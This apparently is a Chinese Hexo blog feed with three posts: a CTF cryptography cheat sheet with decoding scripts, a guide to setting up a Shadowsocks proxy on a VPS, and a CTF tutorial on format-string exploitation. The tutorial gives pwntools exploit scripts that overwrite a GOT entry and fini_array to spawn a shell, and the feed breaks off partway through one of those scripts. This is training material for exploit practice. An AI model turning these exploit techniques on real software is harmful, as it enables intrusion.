    <content type="html"><![CDATA[<p>ctf必备解密网站<br><a id="more"></a></p><h2 id="1、密码"><a href="#1、密码" class="headerlink" title="1、密码"></a>1、密码</h2><p>维吉尼亚<br><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="external">https://www.guballa.de/vigenere-solver</a><br>brainfuck密码<br><a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript" target="_blank" rel="external">https://www.nayuki.io/page/brainfuck-interpreter-javascript</a><br>字符串转16进制<br><a href="http://www.3464.com/tools/StrToHex/" target="_blank" rel="external">http://www.3464.com/tools/StrToHex/</a><br>进制转换(这里如果这个数太大，这里可以解决)<br><a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=10%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6&amp;oq=10%25E8%25BD%25AC%25E6%258D%25A216&amp;rsv_pq=b2aaa4a900006164&amp;rsv_t=c585GpBLAmvpieM48PKR9QDP%2BJpsW3F14XD8RRkUVGrt%2BgnKSqffNWd8R4s&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=1&amp;rsv_sug1=1&amp;rsv_sug7=100&amp;bs=10%E8%BD%AC%E6%8D%A216" target="_blank" rel="external">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=10%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6&amp;oq=10%25E8%25BD%25AC%25E6%258D%25A216&amp;rsv_pq=b2aaa4a900006164&amp;rsv_t=c585GpBLAmvpieM48PKR9QDP%2BJpsW3F14XD8RRkUVGrt%2BgnKSqffNWd8R4s&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=1&amp;rsv_sug1=1&amp;rsv_sug7=100&amp;bs=10%E8%BD%AC%E6%8D%A216</a><br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flkweshdyqj30qz0a4mxy.jpg" alt=""><br>md5<br><a href="http://www.dmd5.com/" target="_blank" rel="external">http://www.dmd5.com/</a><br>生成二维码<br><a href="http://tool.chinaz.com/qrcode" target="_blank" rel="external">http://tool.chinaz.com/qrcode</a><br>词频分析<br><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx" target="_blank" rel="external">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a><br><a href="https://quipqiup.com/" target="_blank" rel="external">https://quipqiup.com/</a><br>libc库查询<br><a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a><br>栅栏密码<br><a href="http://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="external">http://www.qqxiuzi.cn/bianma/zhalanmima.php</a><br>解密代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">char s[]= <span class="string">"tn c0afsiwal kes,hwit1r  g,npt  ttessfu&#125;ua u  hmqik e &#123;m,  n huiouosarwCniibecesnren."</span>;  </div><div class="line">char t[<span class="number">86</span>]= <span class="string">""</span>;  </div><div class="line">int i,j,k;</div><div class="line">k=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">17</span>;i++)  </div><div class="line">&#123;  </div><div class="line">      <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)  </div><div class="line">      &#123;  </div><div class="line">                t[k++]= ch[j*<span class="number">17</span>+i];  </div><div class="line">      &#125;  </div><div class="line">&#125;  </div><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">85</span>;i++)</div><div class="line">&#123;</div><div class="line">    printf(<span class="string">"%c"</span>,t[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>当铺密码<br>王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125<br>凯撒密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python </span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">__author__ = <span class="string">'ByStudent'</span></div><div class="line">lstr=<span class="string">"""U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG*bRH7YJH7YSH]*=93dVZ3^S8*$:8"&amp;:9U]RH;g=8Y!U92'=j*$KH]ZSj&amp;[S#!gU#*dK9\."""</span></div><div class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">127</span>):</div><div class="line">    str1 = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lstr:</div><div class="line">        temp = chr((ord(i)+p)%<span class="number">127</span>)</div><div class="line">        <span class="keyword">if</span> <span class="number">32</span>&lt;ord(temp)&lt;<span class="number">127</span> :</div><div class="line">            str1 = str1 + temp</div><div class="line">            feel = <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">             feel = <span class="number">0</span></div><div class="line">             <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> feel == <span class="number">1</span>:</div><div class="line">         print(str1)</div></pre></td></tr></table></figure></p><p>莫斯密码<br><a href="http://www.jb51.net/tools/morse.htm" target="_blank" rel="external">http://www.jb51.net/tools/morse.htm</a><br>希尔密码<br>密文： 22,09,00,12,03,01,10,03,04,08,01,17 （明文：wjamdbkdeibr）<br>解题思路：使用的矩阵是 1 2 3 4 5 6 7 8 10<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">__Url__ = &apos;Http://www.purpleroc.com&apos;</div><div class="line">__author__ = &apos;Tracy_梓朋&apos;</div><div class="line">from numpy import *</div><div class="line">Dic = &#123;chr(i+97):i for i in range(26)&#125;</div><div class="line">def decode(pwd, org):</div><div class="line">    temp = []</div><div class="line">    result = []</div><div class="line">    while True:</div><div class="line">        if len(pwd) % 3 != 0:</div><div class="line">            pwd.append(pwd[-1])</div><div class="line">        else:</div><div class="line">            break</div><div class="line">    for i in pwd:</div><div class="line">        temp.append(Dic.get(i))</div><div class="line">    temp = array(temp)</div><div class="line">    temp = temp.reshape(len(pwd)/3, 3)</div><div class="line">    #print temp</div><div class="line">    #print org</div><div class="line">    xx = matrix(temp)*org</div><div class="line">    for j in range(len(pwd)/3):</div><div class="line">        for i in range(3):</div><div class="line">            if (int(xx[j, i]) &gt;= 26):</div><div class="line">                result.append(chr(xx[j, i] % 26 + 97))</div><div class="line">                #print xx[j, i] % 26</div><div class="line">            else:</div><div class="line">                #print xx[j, i]</div><div class="line">                result.append(chr(xx[j, i] + 97))</div><div class="line">    return result</div><div class="line">def get_vmatrix(org):</div><div class="line">    org_adjoin = org.I*linalg.det(org)</div><div class="line">    print org_adjoin</div><div class="line">    org_det = int(str(abs(linalg.det(org))).split(&apos;.&apos;)[0])</div><div class="line">    print org_det</div><div class="line">    for i in range(1, 26):</div><div class="line">        if i * org_det % 26 == 1:</div><div class="line">            break</div><div class="line">    org_mod = -org_adjoin * i % 26</div><div class="line">    org_mod = matrix(org_mod)</div><div class="line">    temp = []</div><div class="line">    for i in range(org_mod.shape[0]):</div><div class="line">        for j in range(org_mod.shape[1]):</div><div class="line">            temp.append(int(str(org_mod[i, j]).split(&apos;.&apos;)[0]))</div><div class="line">    org_final = matrix(temp).reshape(org_mod.shape[0], org_mod.shape[1])</div><div class="line">    #print org_final</div><div class="line">    return org_final</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    &apos;&apos;&apos; for test</div><div class="line">    pwd = list(&quot;act&quot;)</div><div class="line">    org = matrix(array([[6, 24, 1], [13 , 16, 10], [20, 17, 15]]))</div><div class="line">    result = decode(pwd, org)</div><div class="line">    print &quot;&quot;.join(result)</div><div class="line">    deorg = matrix(array([[8, 5, 10], [21 , 8, 21], [21, 12, 8]]))</div><div class="line">    result = decode(result, deorg)</div><div class="line">    print &quot;&quot;.join(result)</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    pwd = &quot;wjamdbkdeibr&quot;</div><div class="line">    pwd = list(pwd)</div><div class="line">    org = matrix(array([[1,2,3],[4,5,6],[7,8,10]]))</div><div class="line">    org_vm = get_vmatrix(org)</div><div class="line">    print org_vm</div><div class="line">    print &quot;Your flag is :&quot; + &quot;&quot;.join(decode(pwd, org_vm))</div></pre></td></tr></table></figure></p><p>unicode编码，时间戳<br><a href="http://tool.chinaz.com/Tools/Unicode.aspx" target="_blank" rel="external">http://tool.chinaz.com/Tools/Unicode.aspx</a></p><p>手机密码(最后一位不能超过4,85(错))<br><img src="http://ww1.sinaimg.cn/large/006rgqhqly1fl0d49b95aj30el0a8dlz.jpg" alt=""><br>键盘密码（123–x,y）</p><p>RSA加密过程<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">找到两个大素数p和q，计算出n=p×q</div><div class="line">得到φ=(p−<span class="number">1</span>)×(q−<span class="number">1</span>)，然后选择一个e(<span class="number">1</span>大于e小于φ)，且gcd(φ,e)=<span class="number">1</span>，gcd为最大公约数，即e和φ互质(互为质数)</div><div class="line">计算出d</div><div class="line">，计算方法:(e×d)%φ=<span class="number">1</span></div><div class="line">得到了公私钥对，其中&#123;e,n&#125;</div><div class="line">为公钥，&#123;d,n&#125;为私钥。</div><div class="line">针对明文M，进行加密：C=Me%n，得到的C</div><div class="line">即为密文</div><div class="line">针对密文C，进行解密，M=Cd%n，得到的M即为明文</div></pre></td></tr></table></figure></p><p>攻击方法<br>1、直接分解n(前提是n比较小)<br>2、共模攻击，N相同<br>3、低加密指数攻击<br>4、低加密指数广播攻击:这个识别起来比较简单，加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ctf必备解密网站&lt;br&gt;
    
    </summary>
    
      <category term="misc" scheme="http://yoursite.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>vps-翻墙访问Google浏览器</title>
    <link href="http://yoursite.com/2018/05/09/misc_vpn/"/>
    <id>http://yoursite.com/2018/05/09/misc_vpn/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-02T04:16:32.960Z</updated>
    
    <content type="html"><![CDATA[<p>穿越万里长城只为你——Google,hexo的颜值和正义<br><a id="more"></a></p><h1 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h1><h2 id="1、为何翻墙"><a href="#1、为何翻墙" class="headerlink" title="1、为何翻墙"></a>1、为何翻墙</h2><p>因为我们这个地方世界太小，需求太多，寻找学习资源</p><h2 id="2、准备工具"><a href="#2、准备工具" class="headerlink" title="2、准备工具"></a>2、准备工具</h2><p>这里是下面需要用到的工具<br>链接：<a href="http://pan.baidu.com/s/1o8JYSps" target="_blank" rel="external">http://pan.baidu.com/s/1o8JYSps</a> 密码：03lo</p><h2 id="3、开始"><a href="#3、开始" class="headerlink" title="3、开始"></a>3、开始</h2><p>1、购买一台服务器(vps)作为跳板，可以访问国外站(ping www.google.com),这里可以买:<a href="https://www.vultr.com/" target="_blank" rel="external">https://www.vultr.com/</a><br>买好以后如下:<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fkrf36cz8dj319z0lmdib.jpg" alt=""><br>第一个箭头可以查看用户名和密码，第二个可以远程连接国外服务器(这里也可以用PuTTY连接，上面工具里有)<br>2、准备翻墙客户端——Shadowsocks.exe<br>工具开启已经给出，运行exe程序即可<br>使用<br><a href="https://www.landiannews.com/archives/20932.html" target="_blank" rel="external">https://www.landiannews.com/archives/20932.html</a><br>3、准备chrome的插件SwitchyOmega<br>这里有个链接:<a href="https://jingyan.baidu.com/article/11c17a2c121c0ff446e39d16.html" target="_blank" rel="external">https://jingyan.baidu.com/article/11c17a2c121c0ff446e39d16.html</a></p><p>换个姿势理解<br>这里有个链接：<a href="https://www.diycode.cc/topics/738" target="_blank" rel="external">https://www.diycode.cc/topics/738</a></p><p>这里前面弄了好久，然而没有用,下面是我用的方式<br>克隆（不知道为什么没有克隆下来）<br><code>git clone https://github.com/clowwindy/shadowsocks-libev.git</code><br>下载<br><code>wget https://github.com/clowwindy/shadowsocks-libev/archive/master.zip</code><br>解压<br><code>unzip master.zip</code><br>运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install shadowsocks</div><div class="line">cd shadowsocks-libev</div><div class="line">sudo apt-get install build-essential autoconf libtool libssl-dev gawk debhelper</div><div class="line">sudo dpkg-buildpackage</div><div class="line">cd ..</div><div class="line">sudo dpkg -i shadowsocks*.deb</div></pre></td></tr></table></figure></p><p>编辑配置<br><code>sudo vim /etc/shadowsocks/config.json</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">        &quot;server&quot;:&quot;45.63.17.127&quot;,</div><div class="line">        &quot;server_port&quot;:8989,</div><div class="line">        &quot;local_port&quot;:1080,</div><div class="line">        &quot;password&quot;:&quot;lala&quot;,</div><div class="line">        &quot;timeout&quot;:300,</div><div class="line">        &quot;method&quot;:&quot;aes-256-cfb&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>查看进程<br><code>netstat -pantu</code></p><p>启动服务<br><code>ss-server -c /etc/shadowsocks/config.json</code><br>成功<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fkskajl16oj30en01qq2u.jpg" alt=""></p><p>改为后台运行<br><code>nohup ss-server -c /etc/shadowsocks/config.json &amp;</code></p><p>本机配置，运行exe<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fkskabr9eqj30ck09yt8w.jpg" alt=""><br>浏览器chrome插件<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fksknxvxi1j311h0fg3zm.jpg" alt=""></p><h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkskbbjg3rj30wu0j3n15.jpg" alt=""></p><h1 id="hexo安装与配置"><a href="#hexo安装与配置" class="headerlink" title="hexo安装与配置"></a>hexo安装与配置</h1><h2 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h2><p><a href="http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more" target="_blank" rel="external">http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more</a></p><h2 id="2、换主题"><a href="#2、换主题" class="headerlink" title="2、换主题"></a>2、换主题</h2><p><a href="http://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" rel="external">http://blog.csdn.net/qq_33699981/article/details/72716951</a></p><h2 id="3、评论"><a href="#3、评论" class="headerlink" title="3、评论"></a>3、评论</h2><p><a href="https://ioliu.cn/2017/add-valine-comments-to-your-blog/" target="_blank" rel="external">https://ioliu.cn/2017/add-valine-comments-to-your-blog/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;穿越万里长城只为你——Google,hexo的颜值和正义&lt;br&gt;
    
    </summary>
    
      <category term="misc" scheme="http://yoursite.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN——格式化字符串利用</title>
    <link href="http://yoursite.com/2018/05/09/pwn3_me_fmt/"/>
    <id>http://yoursite.com/2018/05/09/pwn3_me_fmt/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-02T02:40:31.007Z</updated>
    
    <content type="html"><![CDATA[<p>FmtStr格式化字符串利用<br><a id="more"></a></p><h1 id="格式化字符串初识"><a href="#格式化字符串初识" class="headerlink" title="格式化字符串初识"></a>格式化字符串初识</h1><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>函数:<br>int printf(const char *format, [argument]);<br>printf()函数的调用格式为: printf(“&lt;格式化字符串&gt;”, &lt;参量表&gt;)。<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg" alt=""></p><p>基本的格式化字符串参数<br>%c：输出字符，配上%n可用于向指定地址写数据。<br>%d：输出十进制整数，配上%n可用于向指定地址写数据。<br>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。<br>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。<br>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。<br>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n (%100d10$n)表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。<br>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line">int a = 123, b = 456;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">  int c = 789;</div><div class="line">  char s[100];</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</div><div class="line">  scanf(<span class="string">"%s"</span>, s);</div><div class="line">  <span class="built_in">printf</span>(s);   //格式化，利用参数传递，打印出我们需要的地址</div><div class="line"><span class="keyword">if</span> (c == 16) </div><div class="line">&#123;</div><div class="line">  puts(<span class="string">"modified c."</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (a == 2) </div><div class="line">  &#123;</div><div class="line">  puts(<span class="string">"modified a for a small number."</span>);</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == 0x12345678)</div><div class="line">    &#123;</div><div class="line">      puts(<span class="string">"modified b for a big number!"</span>);</div><div class="line">    &#125;</div><div class="line">  <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>生成文件<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o fmt fmt.c</code></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>ida调试,因为a，b都是全局变量，找到a,b的地址<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg" alt=""><br>gdb调试<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg" alt=""><br>确定输入的是第6个参数</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">def ha():</div><div class="line">    p = process(<span class="string">'./fmt'</span>)</div><div class="line">    c_addr = int(p.recvuntil(<span class="string">'\n'</span>),16)</div><div class="line">    a_addr = 0x804A024</div><div class="line">    b_addr = 0x804A028</div><div class="line">    <span class="built_in">print</span> hex(c_addr)</div><div class="line">    raw_input()</div><div class="line">    payloadc = p32(c_addr)+<span class="string">'%12x'</span>+<span class="string">'%6$n'</span></div><div class="line">    payloada = <span class="string">'aa'</span>+<span class="string">'%8$n'</span>+<span class="string">'aa'</span>+p32(a_addr)</div><div class="line">    payloadb= p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)+<span class="string">'%104x'</span>+<span class="string">'%6$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%7$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%8$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%9$hhn'</span></div><div class="line">    p.sendline(payloadb)</div><div class="line">    <span class="built_in">print</span> p.recv()</div><div class="line">    p.interactive()</div><div class="line">ha()</div></pre></td></tr></table></figure><p>这个exp解释一下：%12x表示填充12个字节。特别payloada的时候，%8$n是字符输入的，所以占4个字节，所以地址是在第8个参数，但是输出不会打印出来，所以下面的构造payloadb时候，%x$n不算在字节。</p><h1 id="格式化的利用"><a href="#格式化的利用" class="headerlink" title="格式化的利用"></a>格式化的利用</h1><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p>链接：<a href="http://pan.baidu.com/s/1mil6uTE" target="_blank" rel="external">http://pan.baidu.com/s/1mil6uTE</a> 密码：7ff0<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] <span class="string">'/root/ctf/pwn_learning/zjgsu/pwn3/pwn3'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure></p><p>有canary保护，感觉现在还不会</p><h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><p>我们去尝试运行，摸清了基本上的程序的功能。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... asd</span></div><div class="line"><span class="string">Nice to meet you, asd :)</span></div><div class="line"><span class="string">root@kali:pwn3#</span></div></pre></td></tr></table></figure></p><p>用ida打开看看，发现有system函数，很开心.发现main函数有格式化漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">"Please tell me your name... "</span>);</div><div class="line"><span class="keyword">if</span> ( getnline((char *)&amp;v6, 64) )</div><div class="line">&#123;</div><div class="line">  sprintf((char *)&amp;v5, <span class="string">"Nice to meet you, %s :)\n"</span>, &amp;v6);</div><div class="line">  result = <span class="built_in">printf</span>((const char *)&amp;v5);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>printf(&amp;v5)这里是格式化漏洞，继续看发现getnline函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">size_t __cdecl getnline(char *s, int n)</div><div class="line">&#123;</div><div class="line">  char *v3; // [sp+1Ch] [bp-Ch]@1</div><div class="line"></div><div class="line">  fgets(s, n, stdin);</div><div class="line">  v3 = strchr(s, 10);</div><div class="line">  <span class="keyword">if</span> ( v3 )</div><div class="line">    *v3 = 0;</div><div class="line">  <span class="built_in">return</span> strlen(s);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>strlen(s)这里是计算输入进来字符的长度，只有一个参数，这里是不是很熟悉啊，没错。我们的system函数 也只有一个参数system(s),那么我们可以把将system的plt覆盖到strlen的got，再将参数’/bin/sh’传入，这里我们需要做两件事情<br>1、将strlen_got=system_plt<br>2、回到mian函数，将’/bin/sh’输入，这时就能到达system(‘/bin/sh’)</p><h2 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h2><p>这里的问题是，格式化执行一次后程序就会退出了，这里了解一下elf程序运行机制，当程序执行main函数前会执行一些准备开始的程序，比如：。初始化节 .init_array 和 .init<br>结束时也会运行一些结束的程序，比如:动态库还可提供终止节。终止节 .fini_array<br>这就意味着我们可以利用终止节回到mian再次执行。<br>查看终止节<br><code>objdump -s  pwn3 |grep fini</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># objdump -s  pwn3 |grep fini</span></div><div class="line">Contents of section .fini:</div><div class="line">Contents of section .fini_array:</div></pre></td></tr></table></figure></p><p>发现存在终止节<br>接着利用pwn3直接得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div></pre></td></tr></table></figure></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line"><span class="comment">#p = remote('127.0.0.1',4004)</span></div><div class="line">offset =12</div><div class="line"></div><div class="line">writes = &#123;finiSymbol:mainSymbol,strlenGot:systemPlt&#125;</div><div class="line">padding = <span class="string">'aa'</span></div><div class="line">payload1 = padding + fmtstr_payload(offset = offset,writes = writes,numbwritten = 20,write_size=<span class="string">'int'</span>)</div><div class="line"><span class="built_in">print</span> <span class="string">"payload:len = %d   :%s"</span>%(len(payload1),payload1)</div><div class="line">p.recv()</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">p.sendline(payload1)</div><div class="line">sleep(2)</div><div class="line">p.recvline()</div><div class="line">payload2 = <span 